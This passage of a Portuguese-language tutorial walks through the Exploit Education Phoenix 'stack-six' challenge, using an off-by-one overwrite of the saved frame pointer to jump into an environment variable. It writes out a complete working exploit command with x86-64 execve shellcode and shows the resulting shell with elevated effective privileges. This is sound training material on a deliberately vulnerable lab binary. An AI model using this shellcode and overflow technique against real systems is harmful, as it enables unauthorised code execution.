<p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O único valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
Eu recomendo vc tentar encontrar ele por conta própria pois
pode variar de acordo com o seu computador (explicação em breve) :D
.
.
.
.
.
.
.
</code></pre>
<a class="header" href="./stack/phoenix/StackSix.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
<p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
<p>Isso quer dizer que conseguimos execução de código! lembrando que isso é muito frágil: uma alteração nas envs e o exploit quebra!</p>
<p>Nos podemos usar técnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as técnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao invés de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code>
(uma variável <strong>gigantesca</strong> que lista as cores do terminal!</p>
<p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
<p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! Até achar um que funciona é tentativa e erro! Eu recomendo você procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, você pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu é o limite! Ou talvez nem o ceu... ja que esse esse é um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial é sobre quebrar o limite de buffers! Não tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de você socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graça a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Então parabéns por ter chegado ate aqui! :D</p>
<a class="header" href="./stack/phoenix/StackSix.html#-solução" id="-solução"><h1>💫 Solução</h1></a>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>

                </div>

                <!-- Mobile navigation buttons -->
                
                    <a rel="prev" href="./stack/phoenix/StackFive.html" class="mobile-nav-chapters previous" title="Previous chapter">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a rel="next" href="./stack/mitigacoes.html" class="mobile-nav-chapters next" title="Next chapter">
                        <i class="fa fa-angle-right"></i>
                    </a>
                

            </div>

            
                <a href="./stack/phoenix/StackFive.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-left"></i>
                </a>
            

            
                <a href="./stack/mitigacoes.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-right"></i>
                </a>
            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        
    <script type="text/javascript">
        var socket = new WebSocket("ws://localhost:3001");
        socket.onmessage = function (event) {
            if (event.data === "reload") {
                socket.close();
                location.reload(true); // force reload from server (not from cache)
            }
        };

        window.onbeforeunload = function() {
            socket.close();
        }
    </script>


        

        

        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
